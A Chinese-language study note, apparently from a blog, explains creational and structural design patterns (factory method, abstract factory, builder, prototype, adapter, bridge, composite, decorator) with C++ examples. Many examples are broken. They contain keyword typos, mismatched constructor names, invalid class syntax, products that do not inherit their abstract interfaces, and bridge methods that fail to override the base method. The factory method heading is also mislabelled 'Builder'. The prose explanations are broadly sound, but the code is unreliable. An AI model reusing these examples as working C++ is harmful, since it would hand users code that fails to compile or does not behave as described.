- 该模式在多线程环境下需要进行特殊处理，避免多个线程多次创建单例对象。
- 到哪里的客户端代码单元测试可能比较困难，因为许多测试框架以基于继承的方式创建模拟对象。 由于单例类的构造函数是私有的， 而且绝大部分语言无法重写静态方法， 所以你需要想出仔细考虑模拟单例的方法。 要么干脆不编写测试代码， 或者不使用单例模式。

### 工厂方法模式（Builder）

**工厂方法模式**是一种创建型设计模式， 其在父类中提供一个创建对象的方法， 允许子类决定实例化对象的类型。

#### 解决方案

工厂方法模式建议使用特殊的工厂方法代替对于对象构造函数的直接调用（即使用new运算符）。

但是需要注意：仅当这些产品具有共同的基类或者接口时，子类才能返回不同类型的产品。同时基类中的工厂方法还应将其返回类型声明为这一共有接口。

调用工厂方法的代码（通常被视为客户端代码）无需了解不同子类返回实际对象之间的差别。客户端将所有产品视为抽象的`运输`。客户端都知道所有运输对象都提供`交付`方法，但是并不关心其具体实现方式。

#### 工厂方法模式结构

- **产品（Product）**：将会对接口进行声明。对于所有由创建者及其子类构建的对象。这些接口都是通用的。
- **具体产品（Concrete Product）**：产品接口的不同实现。
- **创建者（Creator）**：类声明返回产品对象的工厂方法。该方法的返回对象类型必须与产品接口相匹配。
  - 主要职责并不是创建产品。一般来说，创建者类包含一些与产品相关的核心业务逻辑。工厂方法将这些逻辑处理从具体产品类中分离出来。
- **具体创建者（Concrete Creator）**：将会重写基础工厂方法，使其返回不同类型的产品。注意并不一定每次调用工厂方法都会创建新的实例。工厂方法也可以返回缓存、对象池或者其他来源的已有对象。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\factory.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **在编写代码的过程中，如果无法预知对象确切类别及其依赖关系时，可以使用工厂方法。**
  - 工厂方法将创建产品的代码与实际使用产品的代码分离， 从而能在不影响其他代码的情况下扩展产品创建部分代码。
  - 例如， 如果需要向应用中添加一种新产品， 你只需要开发新的创建者子类， 然后重写其工厂方法即可。
- **如果你希望用户能扩展你软件库或框架的内部组件，可使用工厂方法**。
  - 解决方案是将各框架中构造组件的代码集中到单个工厂方法中， 并在继承该组件之外允许任何人对该方法进行重写。
- **如果你希望复用现有对象来节省系统资源，而不是每次都重新创建对象，可使用工厂方法**。

#### 实现方法

- 让所有产品都遵循同一接口。 该接口必须声明对所有产品都有意义的方法。
- 在创建类中添加一个空的工厂方法。 该方法的返回类型必须遵循通用的产品接口。
- 在创建者代码中找到对于产品构造函数的所有引用。 将它们依次替换为对于工厂方法的调用， 同时将创建产品的代码移入工厂方法。 你可能需要在工厂方法中添加临时参数来控制返回的产品类型。
- 为工厂方法中的每种产品编写一个创建者子类， 然后在子类中重写工厂方法， 并将基本方法中的相关创建代码移动到工厂方法中。
- 如果应用中的产品类型太多， 那么为每个产品创建子类并无太大必要， 这时你也可以在子类中复用基类中的控制参数。
- 如果代码经过上述移动后， 基础工厂方法中已经没有任何代码， 你可以将其转变为抽象类。 如果基础工厂方法中还有其他语句， 你可以将其设置为该方法的默认行为。

#### 代码实现

例子：生产处理器的厂商，一个工厂生产处理器A，一个生产处理器B

```c++
class Core{
public:
	virutal void show() = 0;
};
// 处理器A
class CoreA: public Core{
public:
	void show(){cout << "Core A" << endl;}
};
// 处理器B
class CoreB: public Core{
public:
	void show(){cout << "Core B" << endl;}
};
class Factory{
public:
	virtual Core* CreateCore() = 0;
};
// 生产处理器A的工厂
class FactoryA: Factory{
public:
	CoreA* CreateCore(){return new CoreA;}
};
// 生产处理器B的工厂
class FactoryB: Factory{
public:
	CoreB* CreateCore(){return new CoreB;}
};
```

#### 优缺点

优点：

- 可以避免创建者和具体产品之间的紧密耦合。
- *单一职责原则*。 你可以将产品创建代码放在程序的单一位置， 从而使得代码更容易维护。
- *开闭原则*。 无需更改现有客户端代码， 你就可以在程序中引入新的产品类型。

缺点：

-  应用工厂方法模式需要引入许多新的子类， 代码可能会因此变得更复杂。 最好的情况是将该模式引入创建者类的现有层次结构中。

### 抽象工厂模式（Abstract Factory）

**抽象工厂模式**是一种创建型设计模式， 它能创建一系列相关的对象， 而无需指定其具体类。

#### 解决方案

抽象工厂模式建议为系列中的每件产品明确声明接口 （例如椅子、 沙发或咖啡桌）。 然后， 确保所有产品变体都继承这些接口。 例如， 所有风格的椅子都实现 `椅子`接口； 所有风格的咖啡桌都实现 `咖啡桌`接口， 以此类推。

#### 抽象工厂模式结构

- **抽象产品（Abstract Product）**：为构成系列产品的一组不同但相关的产品声明接口。
- **具体产品（Concrete Product）**：是抽象产品的多种不同类型实现。所有变体都必须实现对应的抽象产品。
- **抽象工厂（Abstract Factory）**：接口声明了一组创建各种抽象产品的方法
- **具体工厂（Concrete Factory）**：实现抽象工厂的构建方法。每个具体工厂都对应特定产品变体，且仅 创建此种产品实体。
- 尽管具体工厂会对具体产品进行初始化， 其构建方法签名必须返回相应的*抽象*产品。 这样， 使用工厂类的客户端代码就不会与工厂创建的特定产品变体耦合。 **客户端** （Client） 只需通过抽象接口调用工厂和产品对象， 就能与任何具体工厂/产品变体交互。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\abstractfactory.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **如果代码需要与多个不同系列的相关产品交互， 但是由于无法提前获取相关信息， 或者出于对未来扩展性的考虑， 你不希望代码基于产品的具体类进行构建， 在这种情况下， 你可以使用抽象工厂。**
  -  抽象工厂为你提供了一个接口， 可用于创建每个系列产品的对象。 只要代码通过该接口创建对象， 那么你就不会生成与应用程序已生成的产品类型不一致的产品。
- **如果你有一个基于一组抽象方法的类， 且其主要功能因此变得不明确， 那么在这种情况下可以考虑使用抽象工厂模式。**
  -  在设计良好的程序中， *每个类仅负责一件事*。 如果一个类与多种类型产品交互， 就可以考虑将工厂方法抽取到独立的工厂类或具备完整功能的抽象工厂类中。

#### 实现方式

- 以不同的产品类型与产品变体为维度绘制矩阵。
- 为所有产品声明抽象产品接口。 然后让所有具体产品类实现这些接口。
- 声明抽象工厂接口， 并且在接口中为所有抽象产品提供一组构建方法。
- 为每种产品变体实现一个具体工厂类。
- 在应用程序中开发初始化代码。 该代码根据应用程序配置或当前环境， 对特定具体工厂类进行初始化。 然后将该工厂对象传递给所有需要创建产品的类。
- 找出代码中所有对产品构造函数的直接调用， 将其替换为对工厂对象中相应构建方法的调用。

#### 代码实现

例子：生产处理器的厂商，一个工厂生产处理器A，一个生产处理器B，同时公式发展迅速，推出了很多不同种类的处理器（单核或多核），在c++实现中，就需要定义一个个的工厂类。

```
// 单核
class SingleCore{
public:
	virtual void show() = 0;
};

class SingleCoreA{
public:
	void show(){cout << "SingleCore A" << endl;}
};

class SingleCoreB{
public:
	void show(){cout << "SingleCore B" << endl;}
};
// 多核
class MultiCore{
public:
	virtual void show() = 0;
};
class MultiCoreA{
public:
	void show(){cout << "MultiCore A" << endl;}
};
class MultiCoreB{
public:
	void show(){cout << "MultiCore B" << endl;}
};
// 工厂
class Factory{
public:
	virtual SingleCore* CreateSingleCore() = 0;
	virtual MultiCore* CreateMultiCore() = 0;
};
// 工厂A，专门生产A处理器
class FactoryA: Factory{
public:
	SingleCore* CreateSingleCore(){return new SingleCoreA;}
	MultiCore* CreateMultiCore(){return new MultiCoreA;}
};
// 工厂B，专门生产B处理器
class FactoryB: Factory{
public:
	SingleCore* CreateSingleCore(){return new SingleCoreB;}
	MultiCore* CreateMultiCore(){return new MultiCoreB;}
};
```



#### 优缺点

优点：

- 可以确保同一工厂生成的产品相互匹配。
- 可以避免客户端和具体产品代码的耦合。
- *单一职责原则*。 你可以将产品生成代码抽取到同一位置， 使得代码易于维护。
-  *开闭原则*。 向应用程序中引入新产品变体时， 你无需修改客户端代码。

缺点：

-  由于采用该模式需要向应用中引入众多接口和类， 代码可能会比之前更加复杂。

### 生成器模式（Builder，建造者模式）

**生成器模式**是一种创建型设计模式， 使你能够分步骤创建复杂对象。 该模式允许你使用相同的创建代码生成不同类型和形式的对象。

#### 解决方案

生成器模式建议将对象构造代码从产品类中抽取出来， 并将其放在一个名为*生成器*的独立对象中。

生成器模式让你能够分步骤创建复杂对象。 生成器不允许其他对象访问正在创建中的产品。

该模式会将对象构造过程划分为一组步骤，每次创建对象时， 你都需要通过生成器对象执行一系列步骤。 重点在于你无需调用所有步骤， 而只需调用创建特定对象配置所需的那些步骤即可。

当你需要创建不同形式的产品时， 其中的一些构造步骤可能需要不同的实现。

在这种情况下， 你可以创建多个不同的生成器， 用不同方式实现一组相同的创建步骤。 然后你就可以在创建过程中使用这些生成器 （例如按顺序调用多个构造步骤） 来生成不同类型的对象。

**主管：**可以进一步将用于创建产品的一系列生成器步骤调用抽取成为单独的*主管*类。 主管类可定义创建步骤的执行顺序， 而生成器则提供这些步骤的实现。

- 严格来说， 你的程序中并不一定需要主管类。 客户端代码可直接以特定顺序调用创建步骤。 不过， 主管类中非常适合放入各种例行构造流程， 以便在程序中反复使用。
- 此外， 对于客户端代码来说， 主管类完全隐藏了产品构造细节。 客户端只需要将一个生成器与主管类关联， 然后使用主管类来构造产品， 就能从生成器处获得构造结果了。

#### 生成器模式结构

- **生成器（Builder）**：接口声明在所有类型生成器中通用的产品构造步骤。
- **具体生成器（Concrete Builder）**：提供构造过程的不同实现。具体生成器也可以构造不遵循通用接口的产品。
- **产品（Product）**：最终生成的对象。有不同生成器构造的产品无需属于同一类层次结构或者接口。
- **主管（Director）**：定义调用构造步骤的顺序，这样就可以创建和复用特定的产品和配置。
- **客户端（Client）**：必须将某个生成器对象与主管类关联。一般情况下，只需要通过主管类构造函数的参数进行一次性关联即可。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\builder.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **使用生成器模式可以避免“重叠构造函数”的出现**。
  - 生成器模式让你可以分步骤生成对象， 而且允许你仅使用必须的步骤。 应用该模式后， 你再也不需要将几十个参数塞进构造函数里了。
- **当你希望使用代码创建不同形式的产品 （例如石头或木头房屋） 时， 可使用生成器模式。**
  - 如果你需要创建的各种形式的产品， 它们的制造过程相似且仅有细节上的差异， 此时可使用生成器模式。
  - 基本生成器接口中定义了所有可能的制造步骤， 具体生成器将实现这些步骤来制造特定形式的产品。 同时， 主管类将负责管理制造步骤的顺序。
- **使用生成器构造组合树或其他复杂对象。**
  - 生成器模式让你能分步骤构造产品。 你可以延迟执行某些步骤而不会影响最终产品。 你甚至可以递归调用这些步骤， 这在创建对象树时非常方便。
  - 生成器在执行制造步骤时， 不能对外发布未完成的产品。 这可以避免客户端代码获取到不完整结果对象的情况。

#### 实现方法

- 清晰地定义通用步骤， 确保它们可以制造所有形式的产品。 否则你将无法进一步实施该模式。
- 在基本生成器接口中声明这些步骤。
- 为每个形式的产品创建具体生成器类， 并实现其构造步骤。
- 考虑创建主管类。 它可以使用同一生成器对象来封装多种构造产品的方式。
- 客户端代码会同时创建生成器和主管对象。 
- 只有在所有产品都遵循相同接口的情况下， 构造结果可以直接通过主管类获取。 否则， 客户端应当通过生成器获取构造结果。

#### 代码实现

例子：以建造小人为例

```
class Builder{
public:
	virtual void BuildHead(){}
	virtual void BuildBody(){}
	virtual void BuildLeftArm(){}
	virtual void BuildRightArm(){}
	virtual void BuildLeftLeg(){}
	virtual void BuildRightLeg(){}
};
class ThinBuilder: Builder{
public:
	void BuildHead(){cout << "Build Thin Head" << endl;}
	void BuildBody(){cout << "Build Thin Body" << endl;}
	void BuildLeftArm(){cout << "Build Thin LeftArm" << endl;}
	void BuildRightArm(){cout << "Build Thin RightArm" << endl;}
	void BuildLeftLeg(){cout << "Build Thin LeftLeg" << endl;}
	void BuildRightLeg(){cout << "Build Thin RightLeg" << endl;}
};
class FatBuilder: Builder{
public:
	void BuildHead(){cout << "Build Fat Head" << endl;}
	void BuildBody(){cout << "Build Fat Body" << endl;}
	void BuildLeftArm(){cout << "Build Fat LeftArm" << endl;}
	void BuildRightArm(){cout << "Build Fat RightArm" << endl;}
	void BuildLeftLeg(){cout << "Build Fat LeftLeg" << endl;}
	void BuildRightLeg(){cout << "Build Fat RightLeg" << endl;}
};
class Director{
private:
	Builder* m_pBuilder;
public:
	Director(Builder* builder){m_pBuilder = builder;}
	void Create(){
		m_pBuilder->BuildHead();
		m_pBuilder->BuildBody();
		m_pBuilder->BuildLeftArm();
		m_pBuilder->BuildRightArm();
		m_pBuilder->BuildLeftLeg();
		m_pBuilder->BuildRightLeg();
	}
};

// 客户端使用
int main(){
	ThinBuilder thin;
	Director director(&thin);
	director.Create();
	retun 0;
}
```

#### 优缺点

优点：

- 可以分步创建对象，暂缓创建步骤或者递归运行创建步骤
- 生成不同形式的产品时，可以复用相同的制造代码
- 单一职责原则。可以将复杂构造代码从产品的业务逻辑中分离出来。

缺点：

- 由于该模式需要新增多个类，因此代码整体复杂程度有所增加。

### 原型模式（Clone）

**原型模式**是一种创建型设计模式， 使你能够**复制**已有对象， 而又无需使代码依赖它们所属的类。

#### 解决方案

原型模式将克隆过程委派给被克隆的实际对象。 模式为所有支持克隆的对象声明了一个通用接口， 该接口让你能够克隆对象， 同时又无需将代码和对象所属类耦合。 通常情况下， 这样的接口中仅包含一个 `克隆`方法。

其运作方式如下： 创建一系列不同类型的对象并不同的方式对其进行配置。 如果所需对象与预先配置的对象相同， 那么你只需克隆原型即可， 无需新建一个对象。

#### 原型模式结构

- **原型（Prototype）**：接口将对克隆方法进行声明。在绝大部分情况下，其中只会由一个名为clone的方法
- **具体原型（Concrete Prototype）**：将实现克隆方法。除了将原始对象的数据复制到克隆体中之外，该方法有时还需要处理克隆过程中的极端情况，例如克隆关联对象和梳理递归依赖等。
- **客户端（Client）**：可以复制实现了原型接口的任何对象。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\clone.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **如果需要复制一些对象，同时有希望代码独立于这些对象所属的具体类，可以使用原型模式。**
  - 通常出现在代码需要处理第三方代码通过接口传递过来的对象时。 即使不考虑代码耦合的情况， 你的代码也不能依赖这些对象所属的具体类， 因为你不知道它们的具体信息。
  - 原型模式为客户端代码提供一个通用接口， 客户端代码可通过这一接口与所有实现了克隆的对象进行交互， 它也使得客户端代码与其所克隆的对象具体类独立开来。
- **如果子类的区别仅在于其对象的初始化方式，那么可以使用该模式来减少子类的数量，别人创建这些子类的目的可能是为了创建特定类型的对象。**
  -  在原型模式中， 你可以使用一系列预生成的、 各种类型的对象作为原型。
  - 客户端不必根据需求对子类进行实例化， 只需找到合适的原型并对其进行克隆即可。

#### 实现方式

- 创建原型接口， 并在其中声明 `克隆`方法。 如果你已有类层次结构， 则只需在其所有类中添加该方法即可。
- 原型类必须另行定义一个以该类对象为参数的构造函数。 构造函数必须复制参数对象中的所有成员变量值到新建实体中。 如果你需要修改子类， 则必须调用父类构造函数， 让父类复制其私有成员变量值。
- 克隆方法通常只有一行代码： 使用 `new`运算符调用原型版本的构造函数。 注意， 每个类都必须显式重写克隆方法并使用自身类名调用 `new`运算符。 否则， 克隆方法可能会生成父类的对象。
- 你还可以创建一个中心化原型注册表， 用于存储常用原型。

#### 代码实现

例如：简历打印。原始的手稿相当于原型，通过复印创造出更多的新简历是原型模式的基本思想。

```c++
// 父类
class Resume{
protected:
	char* name;
public:
	Result(){}
	virtual ~Result(){}
	virtual Resume* clone(){return NULL;}
	virtual void Set(char* str){}
	virtual void Show(){}
};

class ResumeA: public Resume{
public:
	ResumeA(const char* str);
	ResumeA(const ResumeA &r);
	~ResumeA();
	ResuleA* Clone();
	void show();
};
ResumeA::ResumeA(const char* str){
	if(str == NULL){
		name = new char[1];
		name[0] = '\0';
	}
	else{
		name = new char[strlen(str)+1];
		strcpy(name, str);
	}
}
ResumeA::~ResumeA(){delete[] name;}
ResumeA::ResumeA(const Resume& r){
	name = new char[strlen(r.name)+1];
	strcpy(name, r.name);
}
ResumeA* ResumeA::Clone(){
	return new ResumeA(*this);
}
void ResumeA::Show(){
	cout << "ResumeA name:" << name << endl;
}

// 客户端
int main(){
    Resume* r1 = new ResumeA("A");
    Resume* r2 = new ResumeB("B");
    Resume* r3 = r1->Clone();
    Resume* r4 = r2->Clone();
    r1->Show();r2->Show();
    delete r1; delete r2;
    r1 = r2 = NULL;
    // 深拷贝对于r3，r4无影响
    r3->Show(); r4->Show();
    delete r3; delete r4;
    r3 = r4 = NULL;
    return 0;
}
```

#### 优缺点

优点：

- 可以克隆对象，而无需与他们所属的具体类相耦合
- 可以克隆预生成原型，避免反复运行初始化代码
- 可以更方便生成复杂对象
- 可以用继承以外的方法来处理复杂对象的不同配置

缺点：

- 克隆包含循环引用的复杂对象可能非常复杂。

## 结构型模型

### 适配器模型（Adapter，Wrapper）

**适配器模式**是一种结构型设计模式， 它能使接口不兼容的对象能够相互合作。

#### 解决方案

- 可以创建一个*适配器*。 这是一个特殊的对象， 能够转换对象接口， 使其能与其他对象进行交互。
- 适配器模式通过封装对象将复杂的转换过程隐藏于幕后。 被封装的对象甚至察觉不到适配器的存在。 例如， 你可以使用一个将所有数据转换为英制单位 （如英尺和英里） 的适配器封装运行于米和千米单位制中的对象。
- 适配器不仅可以转换不同格式的数据， 其还有助于采用不同接口的对象之间的合作。 
- 有时你甚至可以创建一个双向适配器来实现双向转换调用。

#### 适配器模式结构

**对象适配器：**

- **客户端（Client）**：包含当前程序业务逻辑的类
- **客户端接口（Client Interface）**：描述了其他类与客户端代码合作时必须遵循的协议。
- **服务（Service）**：客户端与其接口不兼容，因此无法直接调用其功能。
- **适配器（Adapter）**：一个可以同时与客户端和服务端交互的类：他在实现客户端接口的同时封装了服务对象。适配器接受客户端通过适配器接口发起的调用，并将其转换为是用于被封装服务对象的调用。
- 客户端的代码只需通过接口与适配器交互即可。因此，可以向程序中添加新类型的适配器而无需修改已有代码。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\adapter.png" alt="img" style="zoom:80%;" />
</div>

**类适配器：**

- **类适配器**不需要封装任何对象，因为他同时继承了客户端和服务的行为。适配功能在重写的方法中完成。最后生成的适配器可以替代已有的客户端类进行使用。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\adapter2.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **当希望使用某个类，但是其接口与其他代码不兼容时，可以使用适配器类。**
  - 适配器模式允许创建一个中间层类，其可做为代码与遗留类、第三方类后者提供怪异接口的类之间的转换器。
- **如果需要复用这样一些类，他们处于同一个继承体系，并且他们又有了额外的一些共同的方法，但是这些共同的方法不是所有在这一继承体系中的子类所具有的共性。**
  - 你可以扩展每个子类， 将缺少的功能添加到新的子类中。 但是， 你必须在所有新子类中重复添加这些代码， 这样会使得代码有坏味道。

#### 实现方式

- 确保至少有两个类的接口不兼容：
  - 一个无法修改 （通常是第三方、 遗留系统或者存在众多已有依赖的类） 的功能性*服务*类。
  - 一个或多个将受益于使用服务类的*客户端*类。
- 声明客户端接口， 描述客户端如何与服务交互。
- 创建遵循客户端接口的适配器类。 所有方法暂时都为空。
- 在适配器类中添加一个成员变量用于保存对于服务对象的引用。 通常情况下会通过构造函数对该成员变量进行初始化， 但有时在调用其方法时将该变量传递给适配器会更方便。
- 依次实现适配器类客户端接口的所有方法。 适配器会将实际工作委派给服务对象， 自身只负责接口或数据格式的转换。
- 客户端必须通过客户端接口使用适配器。 这样一来， 你就可以在不影响客户端代码的情况下修改或扩展适配器。

#### 代码实现

STL中就用到了适配器模式。STL中实现了一种数据结构为双端队列（deque），支持前后两端的插入和删除。STL实现栈和队列时，没有从头开始定义他们，而是直接使用双端队列实现的。这里双端队列就扮演了适配器的角色。队列用到了他的后端插入，前端删除。栈用到了后端插入，后端删除。

```
// 双端队列
class Deque{
public:
	void push_back(int x){cout << "deque push_back" << endl;}
	void push_front(int x){cout << "deque push_front" << endl;}
	void pop_back(){cout << "deque pop_back" << endl;}
	void pop_front(){cout << "deque pop_front" << endl;}
};
// 顺序容器
class Sequence{
public:
	virtual void push(int x) = 0;
	virtual void pop() = 0;
};
// 栈
class Stack::Sequence{
public:
	void push(int x){deque.push_back(x);}
	void pop(){deque.pop_back();}
private:
	Deque deque;
};
// 队列
class Queue::Sequence{
public:
	void push(int x){deque.push_back(x);}
	void pop(){deque.pop_front();}
private:
	Deque deque;
};

int main(){
	Sequence *s1 = new Stack();
	Sequence *s2 = new Queue();
	s1->push(1);s1->pop();
	s2->push(2);s2->pop();
	delete s1; delete s2;
	s1 = s2 = NULL:
	return 0;
}
```

#### 优缺点

优点：

- _单一职责原则_你可以将接口或数据转换代码从程序主要业务逻辑中分离。
-  *开闭原则*。 只要客户端代码通过客户端接口与适配器进行交互， 你就能在不修改现有客户端代码的情况下在程序中添加新类型的适配器。

缺点：

- 代码整体复杂度增加， 因为你需要新增一系列接口和类。 有时直接更改服务类使其与其他代码兼容会更简单。

### 桥接模式（Bridge）

**桥接模式**是一种结构型设计模式， 可将一个大类或一系列紧密相关的类拆分为抽象和实现两个独立的层次结构， 从而能在开发时分别使用。

#### 解决方案

问题的根本原因是我们试图在两个独立的维度—**形状与颜色**—上扩展形状类。 这在处理类继承时是很常见的问题。

桥接模式通过将继承改为组合的方式来解决这个问题。 具体来说， 就是抽取其中一个维度并使之成为独立的类层次， 这样就可以在初始类中引用这个新层次的对象， **从而使得一个类不必拥有所有的状态和行为**。

#### 桥接模式结构
- **抽象部分（Abstraction）**：提供高层控制逻辑，依赖于完成底层实际工作的实现对象。
- **实现部分（Implementation）**：为所有具体实现声明通用接口。抽象部分仅能通过在这里声明的方法与实现对象交互。
- **具体实现（Concrete Implementations）**：包括特定于平台的代码。
- **精确抽象（Refined Abstration）**：提供控制逻辑的变体。于其父类一样，通过通用实现接口与不同的实现进行交互。
- 通常情况下，客户端仅关心如何与抽象部分合作。但是，客户端需要将抽象对象与一个实现对象连接起来。
<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\bridge.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景
- **如果你想要拆分或重组一个具有多重功能的庞杂类 （例如能与多个数据库服务器进行交互的类）， 可以使用桥接模式。**
  - 类的实现行数越多，弄清其运行方式就越困难，对齐进行修改所花费的时间就越长。桥接模式可以将庞杂类拆分为几个类层次结构。 此后， 你可以修改任意一个类层次结构而不会影响到其他类层次结构。 这种方法可以简化代码的维护工作， 并将修改已有代码的风险降到最低。
- **如果你希望在几个独立维度上扩展一个类， 可使用该模式。**
  - 桥接建议将每个维度抽取为独立的类层次。 初始类将相关工作委派给属于对应类层次的对象， 无需自己完成所有工作。
- **如果你需要在运行时切换不同实现方法， 可使用桥接模式。**

#### 实现方式
- 明确类中独立的维度。 独立的概念可能是： 抽象/平台， 域/基础设施， 前端/后端或接口/实现。
- 了解客户端的业务需求， 并在抽象基类中定义它们。
- 确定在所有平台上都可执行的业务。 并在通用实现接口中声明抽象部分所需的业务。
- 为你域内的所有平台创建实现类， 但需确保它们遵循实现部分的接口。
- 在抽象类中添加指向实现类型的引用成员变量。 抽象部分会将大部分工作委派给该成员变量所指向的实现对象。
- 如果你的高层逻辑有多个变体， 则可通过扩展抽象基类为每个变体创建一个精确抽象。
- 客户端代码必须将实现对象传递给抽象部分的构造函数才能使其能够相互关联。 此后， 客户端只需与抽象对象进行交互， 无需和实现对象打交道。

#### 代码实现
例子：考虑装操作系统，有多种配置的计算机，同样有多款操作系统，如何使用桥接模式呢？可以将操作系统和计算机分别抽象出来，减少他们的耦合度。
```
// 操作系统
class OS{
public:
  virtual void InstallOS_Imp()
};
class WindowOS: public OS{
public:
  void InstallOS_Imp(){cout << "Install Window OS" << endl;}
};
class LinuxOS: public OS{
public:
  void InstallOS_Imp(){cout << "Install Linux OS" << endl;}
};
class MacOS: public OS{
public:
  void InstallOS_Imp(){cout << "Install Mac OS" << endl;}
};

// 计算机
class Computer{
public:
  vitual void InstallOS(OS *os){}
};
class DellComputer: public Computer{
public:
  void Install(OS *os){os->InstallOS_Imp();}
};
class HPComputer: public Computer{
public:
  void Install(OS *os){os->InstallOS_Imp();}
};
class AppleComputer: public Computer{
public:
  void Install(OS *os){os->InstallOS_Imp();}
};

int main(){
  OS *os1 = new WindowOS();
  OS *os2 = new LinuxOS();
  OS *os3 = new MacOS();
  Computer *computer1 = new AppleComputer();
  computer1->Install(os3);
  return 0;
}
```

#### 优缺点
优点：
- 你可以创建与平台无关的类和程序。
- 客户端代码仅与高层抽象部分进行互动，不会接触到平台的详细信息。
- 开闭原则。 你可以新增抽象部分和实现部分， 且它们之间不会相互影响。
- 单一职责原则。 抽象部分专注于处理高层逻辑， 实现部分处理平台细节。
缺点：
- 对高内聚的类使用该模式可能会让代码更加复杂。

### 组合模式(Composite)
**组合模式**是一种结构性设计模式，你可以使用它将对象组合成树状结构，并且能像使用独立对象一样使用它们。

#### 解决方案
组合模式建议使用一个通用接口来与`产品和盒子`进行交互， 并且在该接口中声明一个计算总价的方法。
该方式的最大优点在于你无需了解构成树状结构的对象的具体类。 

#### 组合模式结构
- **组件（Component）**：接口描述了树中简单项目和复杂项目所共有的操作。
- **叶节点（Leaf）**：是树的基本结构，它不包含子项目。一般情况下，叶节点最终会完成大部分的实际工作，因为他们无法将工作指派给其他部分。
- **容器（Container）**：是包含叶节点或者其他容器等子项目的单位。容器不知道其子项目所属的具体类，他只通过通用的组件接口与其子项目交互。
- **客户端（Client）**：通过组件接口与所有项目交互。因此客户端能以相同方式与树状结构中的简单或者复杂项目交互。
<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\composite.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景
- **如果你需要实现树状对象结构，可以使用组合模式。**
  - 组合模式为你提供了两种共享公共接口的基本元素类型： 简单叶节点和复杂容器。 容器中可以包含叶节点和其他容器。 这使得你可以构建树状嵌套递归对象结构。
- **如果你希望客户端代码以相同方式处理简单和复杂元素， 可以使用该模式。**
  - 组合模式中定义的所有元素共用同一个接口。 在这一接口的帮助下， 客户端不必在意其所使用的对象的具体类。

#### 实现方式
- 确保应用的核心模型能够以树状结构表示。 尝试将其分解为简单元素和容器。 记住， 容器必须能够同时包含简单元素和其他容器。
- 声明组件接口及其一系列方法， 这些方法对简单和复杂元素都有意义。
- 创建一个叶节点类表示简单元素。 程序中可以有多个不同的叶节点类。
- 创建一个容器类表示复杂元素。 在该类中， 创建一个数组成员变量来存储对于其子元素的引用。 该数组必须能够同时保存叶节点和容器， 因此请确保将其声明为组合接口类型。
  - 实现组件接口方法时， 记住容器应该将大部分工作交给其子元素来完成。
- 最后， 在容器中定义添加和删除子元素的方法。

#### 代码实现
例子：比如一个集团公司，他有一个母公司，下设很多家子公司。不管是母公司或者子公司，都有各自的财务部，人力部等。对于母公司来说，不论是子公司，还是直属的财务部，人力部等，都是他的部门。
```
class Company{
public:
  Company(string name){m_name = name;}
  virtual ~Company(){}
  virtual void Add(Company *pCom){}
  virtual void Show(int depth){}
protected:
  string m_name;
};
// 具体的公司
class ConcreteCompany: public Company{
public:
  ConcreteCompany(string name): Company(name){}
  virtual ~ConcreteCompany(){}
  void Add(Company *pCon){m_listCompany.push_back(pCom);}
  void Show(int depth){
    for(int i = 0; i < depth; i++)
      cout << "-";
    cout << m_name<<endl;
    list<Company*>::iternator iter = m_listCompany.begin();
    for(; iter != m_listCompany.end(); iter++)
      (*iter)->Show(depth+2);
  }
private:
  list<Company*> m_listCompany;
};

//具体的部门
class FinaneDepartment: public Company{
public:
  FinanceDepartment(string name): Company(name){}
  vitrual ~FinanceDepartment(){}
  virtual void Show(int depth){
    for(int i = 0; i < depth; i++)
      cout << "-";
    cout << m_name << endl;
  }
};
class HRDepartment: public Compnay{
public:
    HRDepartment(string name): Company(name){}
  vitrual ~HRDepartment(){}
  virtual void Show(int depth){
    for(int i = 0; i < depth; i++)
      cout << "-";
    cout << m_name << endl;
  }
}
```

#### 优缺点
优点：
-  你可以利用多态和递归机制更方便地使用复杂树结构。
-  开闭原则。 无需更改现有代码， 你就可以在应用中添加新元素， 使其成为对象树的一部分。
缺点：
- 对于功能差异较大的类，提供公共接口或许会有困难。在特定情况下，你需要过度一般化组件接口，使其变得令人难以理解。

### 装饰模式（Wrapper）
装饰模式是一种结构型设计模式， 允许你通过将对象放入包含行为的特殊封装对象中来为原对象绑定新的行为。

#### 解决方案
- 封装器是装饰模式的别称，这个称谓明确的表达了该模式的主要思想。“封装器”是一个能与其他“目标”对象连接的对象。封装器包含与目标对象相同的一系列方法， 它会将所有接收到的请求委派给目标对象。 但是， 封装器可以在将请求委派给目标前后对其进行处理， 所以可能会改变最终结果。

#### 装饰模式结构
- **部件（Component）**：声明封装器和被封装对象的共用接口。
- **具体部件（Concrete Component）**：是被封装对象所属的类。它定义了基础行为，但是装饰类可以改变这些行为。
- **基础装饰（Base Decorator）**：拥有一个指向被封装对象的引用成员变量。该变量的类型应当被声明为通用部件接口，这样他就可以引用具体的部件和装饰。
- **具体装饰类（Concrete Decorator）**：定义了可动态添加到部件的额外行为。具体装饰类会重写装饰基类的方法，并在调用父类方法之前或者之后进行额外的行为。
- **客户端（Client）**：可以使用多层装饰来封装不见，只要它能使用通用 接口与所有对象互动即可。
<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\wrapper.png" alt="img" style="zoom:80%;" />
</div>
#### 应用场景

- **如果希望在无需修改代码的情况下即可使用对象，且希望在运行时为对象新增额外的行为，可以使用装饰模式。**
  - 装饰能将业务逻辑组织为层次结构， 你可为各层创建一个装饰， 在运行时将各种不同逻辑组合成对象。 由于这些对象都遵循通用接口， 客户端代码能以相同的方式使用这些对象。
- **如果用继承来扩展对象行为的方案难以实现或者根本不可行，你可以使用该模式。**
  - 复用最终类已有行为的唯一方法是使用装饰模式： 用封装器对其进行封装。

#### 实现方式

- 确保业务逻辑可用一个基本组件及多个额外可选层次表示。
